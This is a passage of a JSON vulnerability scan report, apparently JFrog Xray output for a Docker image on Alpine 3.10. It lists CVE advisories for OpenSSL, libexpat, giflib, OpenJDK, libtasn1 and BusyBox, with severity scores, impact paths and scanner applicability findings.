                    "description": "There is a type confusion vulnerability relating to X.400 address processing\ninside an X.509 GeneralName. X.400 addresses were parsed as an ASN1_STRING but\nthe public structure definition for GENERAL_NAME incorrectly specified the type\nof the x400Address field as ASN1_TYPE. This field is subsequently interpreted by\nthe OpenSSL function GENERAL_NAME_cmp as an ASN1_TYPE rather than an\nASN1_STRING.\n\nWhen CRL checking is enabled (i.e. the application sets the\nX509_V_FLAG_CRL_CHECK flag), this vulnerability may allow an attacker to pass\narbitrary pointers to a memcmp call, enabling them to read memory contents or\nenact a denial of service. In most cases, the attack requires the attacker to\nprovide both the certificate chain and CRL, neither of which need to have a\nvalid signature. If the attacker only controls one of these inputs, the other\ninput must already contain an X.400 address as a CRL distribution point, which\nis uncommon. As such, this vulnerability is most likely to only affect\napplications which have implemented their own functionality for retrieving CRLs\nover a network.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-0286",
                            "cwe": [
                                "CWE-843"
                            ],
                            "cvss_v3": "7.4/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:H"
                        }
                    ],
                    "created": "2024-07-01T00:00:00.521Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2023-0286",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks if at least one of the vulnerable API calls is called:</p>\n<ul>\n<li><code>X509_STORE_CTX_get_check_revocation</code></li>\n<li><code>X509_STORE_get_check_revocation</code></li>\n</ul>\n<p>For determining the applicability of this CVE, an additional condition (that the scanner currently does not check) should be verified: The CRL checking option must also be enabled.</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2023-0286",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks if at least one of the vulnerable API calls is called:</p>\n<ul>\n<li><code>X509_STORE_CTX_get_check_revocation</code></li>\n<li><code>X509_STORE_get_check_revocation</code></li>\n</ul>\n<p>For determining the applicability of this CVE, an additional condition (that the scanner currently does not check) should be verified: The CRL checking option must also be enabled.</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2023-0286",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2023-0286",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-652698",
                    "summary": "An issue was discovered in libexpat before 2.6.4. There is a crash within the XML_ResumeParser function because XML_StopParser can stop/suspend an unstarted parser.",
                    "description": "An issue was discovered in libexpat before 2.6.4. There is a crash within the XML_ResumeParser function because XML_StopParser can stop/suspend an unstarted parser.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-50602"
                        }
                    ],
                    "created": "2024-11-08T00:00:00.752Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:expat:2.2.8-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-50602",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-535159",
                    "summary": "Issue summary: Generating excessively long X9.42 DH keys or checking\nexcessively long X9.42 DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_generate_key() to\ngenerate an X9.42 DH key may experience long delays.  Likewise, applications\nthat use DH_check_pub_key(), DH_check_pub_key_ex() or EVP_PKEY_public_check()\nto check an X9.42 DH key or X9.42 DH parameters may experience long delays.\nWhere the key or parameters that are being checked have been obtained from\nan untrusted source this may lead to a Denial of Service.\n\nWhile DH_check() performs all the necessary checks (as of CVE-2023-3817),\nDH_check_pub_key() doesn't make any of these checks, and is therefore\nvulnerable for excessively large P and Q parameters.\n\nLikewise, while DH_generate_key() performs a check for an excessively large\nP, it doesn't check for an excessively large Q.\n\nAn application that calls DH_generate_key() or DH_check_pub_key() and\nsupplies a key or parameters obtained from an untrusted source could be\nvulnerable to a Denial of Service attack.\n\nDH_generate_key() and DH_check_pub_key() are also called by a number of\nother OpenSSL functions.  An application calling any of those other\nfunctions may similarly be affected.  The other functions affected by this\nare DH_check_pub_key_ex(), EVP_PKEY_public_check(), and EVP_PKEY_generate().\n\nAlso vulnerable are the OpenSSL pkey command line application when using the\n\"-pubcheck\" option, as well as the OpenSSL genpkey command line application.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
                    "description": "Issue summary: Generating excessively long X9.42 DH keys or checking\nexcessively long X9.42 DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_generate_key() to\ngenerate an X9.42 DH key may experience long delays.  Likewise, applications\nthat use DH_check_pub_key(), DH_check_pub_key_ex() or EVP_PKEY_public_check()\nto check an X9.42 DH key or X9.42 DH parameters may experience long delays.\nWhere the key or parameters that are being checked have been obtained from\nan untrusted source this may lead to a Denial of Service.\n\nWhile DH_check() performs all the necessary checks (as of CVE-2023-3817),\nDH_check_pub_key() doesn't make any of these checks, and is therefore\nvulnerable for excessively large P and Q parameters.\n\nLikewise, while DH_generate_key() performs a check for an excessively large\nP, it doesn't check for an excessively large Q.\n\nAn application that calls DH_generate_key() or DH_check_pub_key() and\nsupplies a key or parameters obtained from an untrusted source could be\nvulnerable to a Denial of Service attack.\n\nDH_generate_key() and DH_check_pub_key() are also called by a number of\nother OpenSSL functions.  An application calling any of those other\nfunctions may similarly be affected.  The other functions affected by this\nare DH_check_pub_key_ex(), EVP_PKEY_public_check(), and EVP_PKEY_generate().\n\nAlso vulnerable are the OpenSSL pkey command line application when using the\n\"-pubcheck\" option, as well as the OpenSSL genpkey command line application.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-5678",
                            "cwe": [
                                "CWE-754"
                            ],
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2023-11-07T00:00:00.845Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-5678",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-539729",
                    "summary": "Buffer Overflow vulnerability in GifLib Project GifLib v.5.2.1 allows a local attacker to obtain sensitive information via the DumpSCreen2RGB function in gif2rgb.c",
                    "description": "Buffer Overflow vulnerability in GifLib Project GifLib v.5.2.1 allows a local attacker to obtain sensitive information via the DumpSCreen2RGB function in gif2rgb.c",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-48161",
                            "cwe": [
                                "CWE-787"
                            ],
                            "cvss_v3": "7.1/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:H"
                        }
                    ],
                    "created": "2023-11-22T00:00:00.384Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:giflib:5.1.9-r0"
                    ],
                    "extended_information": {
                        "short_description": "A buffer overflow in the gif2rgb tool of GifLib can lead to a crash.",
                        "jfrog_research_severity": "Low",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                                "is_positive": true
                            },
                            {
                                "name": "The issue has an exploit published",
                                "description": "The available PoC is only crashing the `gif2rpg` tool.",
                                "is_positive": false
                            },
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "As `gif2rgb` is a command line tool, exploitation of the vulnerability can lead to a crash of a forked process of the `gif2rgb` tool and not the whole application.\nAlthough the published vulnerability description suggests that the issue \"allows a local attacker to obtain sensitive information\" getting sensitive information is unlikely because:\n\n1. For a local attacker, the vulnerability can be exploited only by executing the tool as a process, which will crash the forked process and won't provide any sensitive information, unless the attacker can run the process with higher privileges. Setting high privileges (like root SETUID) is very unlikely for this kind of image conversion tool.\n\n2. For a remote attacker, no sensitive information will be available to the attacker because upon exploitation the forked process crashes so the sensitive data won't be retrieved.\n\nMoreover, converting GIF to RPG is rare and concerns only specific applications.",
                                "is_positive": true
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The attacker must find a way to execute the `gif2rgb` tool on a crafted GIF image.",
                                "is_positive": true
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:giflib:5.1.9-r0",
                            "cve_id": "CVE-2023-48161",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the <code>gif2rgb</code> utility exists and if it is executed in a script.</p>",
                            "evidence": null,
                            "info": "Gif2Rgb's binary or usage is not found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:giflib:5.1.9-r0",
                            "vulnerability_id": "CVE-2023-48161",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-593708",
                    "summary": "libexpat through 2.6.1 allows an XML Entity Expansion attack when there is isolated use of external parsers (created via XML_ExternalEntityParserCreate).",
                    "description": "libexpat through 2.6.1 allows an XML Entity Expansion attack when there is isolated use of external parsers (created via XML_ExternalEntityParserCreate).",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-28757",
                            "cwe": [
                                "CWE-776"
                            ],
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2024-03-15T00:00:00.159Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:expat:2.2.8-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "cve_id": "CVE-2024-28757",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the following vulnerable functions are called:</p>\n<ul>\n<li><code>XML_Parse</code></li>\n<li><code>XML_ParseBuffer</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "vulnerability_id": "CVE-2024-28757",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-646817",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u421, 8u421-perf, 11.0.24, 17.0.12, 21.0.4, 23;   Oracle GraalVM for JDK: 17.0.12, 21.0.4, 23;   Oracle GraalVM Enterprise Edition: 20.3.15 and  21.3.11. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 4.8 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u421, 8u421-perf, 11.0.24, 17.0.12, 21.0.4, 23;   Oracle GraalVM for JDK: 17.0.12, 21.0.4, 23;   Oracle GraalVM Enterprise Edition: 20.3.15 and  21.3.11. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 4.8 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-21235",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "4.8/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
                        }
                    ],
                    "created": "2024-10-18T00:00:00.041Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-21235",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-670061",
                    "summary": "A flaw in libtasn1 causes inefficient handling of specific certificate data. When processing a large number of elements in a certificate, libtasn1 takes much longer than expected, which can slow down or even crash the system. This flaw allows an attacker to send a specially crafted certificate, causing a denial of service attack.",
                    "description": "A flaw in libtasn1 causes inefficient handling of specific certificate data. When processing a large number of elements in a certificate, libtasn1 takes much longer than expected, which can slow down or even crash the system. This flaw allows an attacker to send a specially crafted certificate, causing a denial of service attack.",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-12133"
                        }
                    ],
                    "created": "2025-02-07T00:00:00.485Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libtasn1:4.14-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-12133",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-190221",
                    "summary": "A NULL pointer dereference in Busybox's hush applet leads to denial of service when processing a crafted shell command, due to missing validation after a \\x03 delimiter character. This may be used for DoS under very rare conditions of filtered command input.",
                    "description": "A NULL pointer dereference in Busybox's hush applet leads to denial of service when processing a crafted shell command, due to missing validation after a \\x03 delimiter character. This may be used for DoS under very rare conditions of filtered command input.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-42376",
                            "cwe": [
                                "CWE-476"
                            ],
                            "cvss_v2": "1.9/CVSS:2.0/AV:L/AC:M/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2021-11-18T00:00:00.346Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:ssl_client:1.30.1-r5",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:busybox:1.30.1-r5"
                    ],
                    "extended_information": {
                        "short_description": "A NULL pointer dereference in Busybox hush leads to denial of service when processing malformed command line arguments.",
                        "full_description": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA NULL pointer dereference in `hush` leads to denial of service when processing a crafted shell command, due to missing validation after a `\\x03` delimiter character. This may be used for DoS under very rare conditions of filtered command input.\nAn attacker that controls `hush` command line arguments can trigger this issue.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The applet must accept arbitrary command line arguments from an external source",
                                "is_positive": true
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                                "is_positive": true
                            },
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "Busybox applets are usually run as standalone (forked) processes and thus a DoS will have a minimal effect",
                                "is_positive": true
                            }
                        ],
                        "remediation": "##### Development mitigations\n\nComment out `CONFIG_HUSH=y` in Busybox's `.config` file and recompile"
                    },
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-42376",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-259736",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Lightweight HTTP Server). Supported versions that are affected are Oracle Java SE: 8u341, 8u345-perf, 11.0.16.1, 17.0.4.1, 19; Oracle GraalVM Enterprise Edition: 20.3.7, 21.3.3 and 22.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Lightweight HTTP Server). Supported versions that are affected are Oracle Java SE: 8u341, 8u345-perf, 11.0.16.1, 17.0.4.1, 19; Oracle GraalVM Enterprise Edition: 20.3.7, 21.3.3 and 22.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21628",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2022-10-24T00:00:00.745Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21628",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-428306",
                    "summary": "A security vulnerability has been identified in all supported versions\n\nof OpenSSL related to the verification of X.509 certificate chains\nthat include policy constraints.  Attackers may be able to exploit this\nvulnerability by creating a malicious certificate chain that triggers\nexponential use of computational resources, leading to a denial-of-service\n(DoS) attack on affected systems.\n\nPolicy processing is disabled by default but can be enabled by passing\nthe `-policy' argument to the command line utilities or by calling the\n`X509_VERIFY_PARAM_set1_policies()' function.",
                    "description": "A security vulnerability has been identified in all supported versions\n\nof OpenSSL related to the verification of X.509 certificate chains\nthat include policy constraints.  Attackers may be able to exploit this\nvulnerability by creating a malicious certificate chain that triggers\nexponential use of computational resources, leading to a denial-of-service\n(DoS) attack on affected systems.\n\nPolicy processing is disabled by default but can be enabled by passing\nthe `-policy' argument to the command line utilities or by calling the\n`X509_VERIFY_PARAM_set1_policies()' function.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-0464",
                            "cwe": [
                                "CWE-295"
                            ],
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2023-03-23T00:00:00.731Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2023-0464",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether OpenSSL supports the vulnerable policy constraints parsing functionality, by checking whether the <code>X509_VERIFY_PARAM_set1_policies</code> function is called (the functionality is disabled by default)</p>\n<p>Note that the scanner does not check for an additional vulnerable case in which the vulnerable policy constraints parsing functionality is enabled via the command line flag <code>-policy</code>. For example, by running <code>openssl ca -policy match</code>. However - in this case, the vulnerability will lead to a DoS of a forked command-line utility, which has a minimal impact on security.</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2023-0464",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether OpenSSL supports the vulnerable policy constraints parsing functionality, by checking whether the <code>X509_VERIFY_PARAM_set1_policies</code> function is called (the functionality is disabled by default)</p>\n<p>Note that the scanner does not check for an additional vulnerable case in which the vulnerable policy constraints parsing functionality is enabled via the command line flag <code>-policy</code>. For example, by running <code>openssl ca -policy match</code>. However - in this case, the vulnerability will lead to a DoS of a forked command-line utility, which has a minimal impact on security.</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
